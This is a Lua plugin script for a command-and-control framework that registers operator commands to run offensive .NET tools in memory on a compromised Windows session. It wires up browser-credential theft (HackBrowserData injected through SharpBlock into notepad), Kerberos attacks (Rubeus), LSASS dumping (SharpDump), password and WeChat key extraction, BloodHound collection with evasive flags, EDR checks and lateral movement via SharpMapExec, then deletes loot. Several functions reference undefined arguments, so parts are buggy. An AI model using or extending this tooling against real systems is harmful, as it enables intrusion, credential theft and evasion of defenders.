local time = require("time")
local strings = require("strings")
local root_command = "common"
function new_sac()
    local sac = new_sacrifice(0,false,false,false,"")
    return sac
end
local function command_register(command_name, command_function, help_string, ttp)
    command(root_command .. ":" .. command_name, command_function, help_string, ttp)
end
-- adcollector
local function ADcollector(args)
    local session = active()
    local file_path = "common/recon/ADcollector_net4.0.exe"
    return execute_assembly(session, script_resource(file_path), args, true, false, false)
end
command_register("ADcollector_net4.0", ADcollector, "ADcollector", "")
-- hack browser data todo
local function HackBrowserData()
    local session = active()
    local randomname = random_string(32)
    local fullpipename = "\\\\.\\pipe\\" .. randomname
    print("Pipe name: " .. fullpipename)

    --local arg = "-e " .. fullpipename .. " -s c:\\windows\\system32\\notepad.exe --disable-bypass-cmdline --disable-bypass-amsi --disable-bypass-etw -a\"-i0.0.0.0 -p20020\""
    --local args = {"-e", fullpipename, "-s", "c:\\windows\\system32\\notepad.exe", "--disable-bypass-cmdline", "--disable-bypass-amsi", "--disable-bypass-etw", "-a", "-i0.0.0.0 -p20020"}
    local args = {"-e", fullpipename, "-s", "c:\\windows\\system32\\notepad.exe", "--disable-bypass-cmdline", "--disable-bypass-amsi", "--disable-bypass-etw"}

    local sharpblock_file = "common/SharpBlock_net4.0.exe"
    local result = execute_assembly(session, script_resource(sharpblock_file), args, true, false, false)
    print("SharpBlock result: " .. result)

    local hack_browser_data_file = script_resource("common/recon/HackBrowserData." .. session.Os.Arch .. ".exe")
    local hack_browser_data_content = base64_encode(read(hack_browser_data_file))
    buploadraw(session, fullpipename, hack_browser_data_content,0744, false)
    for i = 1, 5 do
        time.sleep(0.1)
        buploadraw(session, fullpipename, "ok","")
    end
    print("HackBrowserData end")
end
command_register("HackBrowserData", HackBrowserData, "HackBrowserData", "")

-- ListRDPConnections_net4.5
local function ListRDPConnections_net4_5()
    local session = active()
    local list_rdp_connections_net4_5_path = "common/recon/ListRDPConnections_net4.5.exe"
    return execute_assembly(session, script_resource(list_rdp_connections_net4_5_path), {}, true, false, false)
end
command_register("ListRDPConnections_net_4.5", ListRDPConnections_net4_5, "ListRDPConnections_net4_5", "")
-- end ListRDPConnections_net4.5

-- PVEFINDADUser_net2.0.exe todo
local function PVEFINDADUser_net2_0()
    local session = active()
    local pvefindaduser_net2_0_path = "common/recon/PVEFINDADUser_net2.0.exe"
    local arg = "-current"
    local result = execute_assembly(session, script_resource(pvefindaduser_net2_0_path), {arg}, true, false, false)

end
command_register("PVEFINDADUser_net2.0", PVEFINDADUser_net2_0, "PVEFINDADUser_net2.0", "")
-- end PVEFINDADUser_net2.0.exe

-- Rubeus2.0_Net4.5.exe
local function Rubeus2_0_Net4_5(args)
    local session = active()
    local rubeus2_0_net4_5_path = "common/recon/Rubeus2.0_Net4.5.exe"
    return execute_assembly(session, script_resource(rubeus2_0_net4_5_path), args, true, false, false)
end
command_register("Rubeus2.0_Net4.5", Rubeus2_0_Net4_5, "Rubeus2.0_Net4.5", "")
-- end Rubeus2.0_Net4.5.exe

-- Rubeus2.0_Net4.exe
local function Rubeus2_0_Net4()
    local session = active()
    local rubeus2_0_net4_path = "common/recon/Rubeus2.0_Net4.exe"
    return execute_assembly(session, script_resource(rubeus2_0_net4_path), args, true, false, false)
end
command_register("Rubeus2.0_Net4", Rubeus2_0_Net4, "Rubeus2.0_Net4", "")
-- end Rubeus2.0_Net4.exe

-- Seatbelt.exe
local function Seatbelt()
    local session = active()
    local seatbelt_path = "common/recon/Seatbelt.exe"
    return execute_assembly(session, script_resource(seatbelt_path), {}, true, false, false)
end
command_register("Seatbelt", Seatbelt, "Seatbelt", "")
-- end Seatbelt.exe

-- SharpAidnsdump_net4.0.exe
local function SharpAidnsdump_net4_0()
    local session = active()
    local sharpaidnsdump_net4_0_path = "common/recon/SharpAidnsdump_net4.0.exe"
    return execute_assembly(session, script_resource(sharpaidnsdump_net4_0_path), {}, true, false, false)
end
command_register("SharpAidnsdump_net4.0", SharpAidnsdump_net4_0, "SharpAidnsdump_net4.0", "")
-- end SharpAidnsdump_net4.0.exe

-- SharpDecryptPwd.exe
local function SharpDecryptPwd(args)
    local session = active()
    local sharpdecryptpwd_path = "common/recon/SharpDecryptPwd.exe"
    return execute_assembly(session, script_resource(sharpdecryptpwd_path), args, true, false, false)
end
command_register("SharpDecryptPwd", SharpDecryptPwd, "SharpDecryptPwd", "")
-- end SharpDecryptPwd.exe

-- SharpDetectionTLMSSP_net4.0.exe
local function SharpDetectionTLMSSP_net4_0(args)
    local session = active()
    local sharpdetectiontlmssp_net4_0_path = "common/recon/SharpDetectionTLMSSP_net4.0.exe"
    return execute_assembly(session, script_resource(sharpdetectiontlmssp_net4_0_path), args, true, false, false)
end
command_register("SharpDetectionTLMSSP_net4.0", SharpDetectionTLMSSP_net4_0, "SharpDetectionTLMSSP_net4.0", "")
-- end SharpDetectionTLMSSP_net4.0.exe

-- SharpDirLister.exe
local function SharpDirLister(args)
    local session = active()
    local sharpdirlister_path = "common/recon/SharpDirLister.exe"
    return execute_assembly(session, script_resource(sharpdirlister_path), args, true, false, false)
end
command_register("SharpDirLister", SharpDirLister, "SharpDirLister", "")
-- end SharpDirLister.exe

-- SharpDump_net2.0.exe
local function SharpDump_net2_0()
    local session = active()
    local sharpdump_net2_0_path = "common/recon/SharpDump_net2.0.exe"
    return execute_assembly(session, script_resource(sharpdump_net2_0_path), {}, true, false, false)
end
command_register("SharpDump_net2.0", SharpDump_net2_0, "SharpDump_net2.0", "")
-- end SharpDump_net2.0.exe

-- SharpEDRChecker_net4.0.exe
local function SharpEDRChecker_net4_0(args)
    local session = active()
    local sharpedrchecker_net4_0_path = "common/recon/SharpEDRChecker_net4.0.exe"
    return execute_assembly(session, script_resource(sharpedrchecker_net4_0_path), args, true, false, false)
end
command_register("SharpEDRChecker_net4.0", SharpEDRChecker_net4_0, "SharpEDRChecker_net4.0", "")
-- end SharpEDRChecker_net4.0.exe

-- SharpEventLog3.5.exe
local function SharpEventLog3_5(args)
    local session = active()
    if not isadmin(session) then
        error("This command requires admin privileges")
    end
    local sharpeventlog3_5_path = "common/recon/SharpEventLog3.5.exe"
    local arg = args[1] or "-4624"
    return execute_assembly(session, script_resource(sharpeventlog3_5_path), {arg}, true, false, false)
end
command_register("SharpEventLog3.5", SharpEventLog3_5, "SharpEventLog3.5", "")
-- end SharpEventLog3.5.exe

-- SharpEventLog_net4.0.exe
local function SharpEventLog_net4_0()
    local session = active()
    local sharpeventlog_net4_0_path = "common/recon/SharpEventLog_net4.0.exe"
    local arg = args[1] or "-4624"
    return execute_assembly(session, script_resource(sharpeventlog_net4_0_path), {arg}, true, false, false)
end
command_register("SharpEventLog_net4.0", SharpEventLog_net4_0, "SharpEventLog_net4.0", "")
-- end SharpEventLog_net4.0.exe

-- SharpHound_net4.5.exe
local function SharpHound_net4_0()
    local session = active()
    local sharphound_net4_0_path = "common/recon/SharpHound_net4.5.exe"
    local arg = "-c all --RandomizeFilenames --NoSaveCache --EncryptZip"
    local args = strings.split(arg, " ")
    return execute_assembly(session, script_resource(sharphound_net4_0_path), args, true, false, false)
end
command_register("SharpHound_net4.0", SharpHound_net4_0, "SharpHound_net4.0", "")
-- end SharpHound_net4.0.exe

-- SharpInstallSoft_net3.5.exe
local function SharpInstallSoft_net3_5()
    local session = active()
    local sharpinstallsoft_net3_5_path = "common/recon/SharpInstallSoft_net3.5.exe"
    return execute_assembly(session, script_resource(sharpinstallsoft_net3_5_path), {}, true, false, false)
end
command_register("SharpInstallSoft_net3.5", SharpInstallSoft_net3_5, "SharpInstallSoft_net3.5", "")
-- end SharpInstallSoft_net3.5.exe

-- SharpMapExec_net4.0.exe
local function SharpMapExec_net4_0(args)
    local session = active()
    local sharpmapexec_net4_0_path = "common/recon/SharpMapExec_net4.0.exe"
    execute_assembly(session, script_resource(sharpmapexec_net4_0_path), args, true, false, false)
    bshell(session, "del /f /s /q loot") -- todo
end
command_register("SharpMapExec_net4.0", SharpMapExec_net4_0, "SharpMapExec_net4.0", "")
-- end SharpMapExec_net4.0.exe

-- SharpOXID-Find_net4.0.exe
local function SharpOXID_Find_net4_0(args)
    local session = active()
    local sharpoxid_find_net4_0_path = "common/recon/SharpOXID-Find_net4.0.exe"
    return execute_assembly(session, script_resource(sharpoxid_find_net4_0_path), args, true, false, false)
end
command_register("SharpOXID-Find_net4.0", SharpOXID_Find_net4_0, "SharpOXID-Find_net4.0", "")
-- end SharpOXID-Find_net4.0.exe

-- SharpRDPCheck_net4.6.exe
local function SharpRDPCheck_net4_6(args)
    local session = active()
    local sharprdpcheck_net4_6_path = "common/recon/SharpRDPCheck_net4.6.exe"
    return execute_assembly(session, script_resource(sharprdpcheck_net4_6_path), args, true, false, false)
end
command_register("SharpRDPCheck_net4.6", SharpRDPCheck_net4_6, "SharpRDPCheck_net4.6", "")
-- end SharpRDPCheck_net4.6.exe

-- SharpSearch_net3.5.exe
local function SharpSearch_net3_5(args)
    local session = active()
    local sharpsearch_net3_5_path = "common/recon/SharpSearch_net3.5.exe"
    return execute_assembly(session, script_resource(sharpsearch_net3_5_path), args, true, false, false)
end
command_register("SharpSearch_net3.5", SharpSearch_net3_5, "SharpSearch_net3.5", "")
-- end SharpSearch_net3.5.exe

-- SharpShares_net4.0.exe
local function SharpShares_net4_0(args)
    local session = active()
    local sharpshares_net4_0_path = "common/recon/SharpShares_net4.0.exe"
    return execute_assembly(session, script_resource(sharpshares_net4_0_path), args, true, false, false)
end
command_register("SharpShares_net4.0", SharpShares_net4_0, "SharpShares_net4.0", "")
-- end SharpShares_net4.0.exe

-- SharpShares_sample.exe
local function SharpShares_sample(args)
    local session = active()
    local arg = args[1] or "ips"
    if args[1] ~= "ips" and args[1] ~= "shares" then
        error("Invalid argument")
    end
    local sharpshares_sample_path = "common/recon/SharpShares_sample.exe"
    return execute_assembly(session, script_resource(sharpshares_sample_path), {arg[1]}, true, false, false)
end
command_register("SharpShares_sample", SharpShares_sample, "SharpShares_sample", "")
-- end SharpShares_sample.exe

-- Sharpwmi_net4.0.exe
local function Sharpwmi_net4_0(args)
    local session = active()
    local sharpwmi_net4_0_path = "common/recon/Sharpwmi_net4.0.exe"
    return execute_assembly(session, script_resource(sharpwmi_net4_0_path), args, true, false, false)
end
command_register("Sharpwmi_net4.0", Sharpwmi_net4_0, "Sharpwmi_net4.0", "")
-- end Sharpwmi_net4.0.exe

-- SharpWxDump.exe
local function SharpWxDump(args)
    local session = active()
    local sharpwxdump_path = "common/recon/SharpWxDump.exe"
    return execute_assembly(session, script_resource(sharpwxdump_path), args, true, false, false)
end
command_register("SharpWxDump", SharpWxDump, "SharpWxDump", "")
-- end SharpWxDump.exe
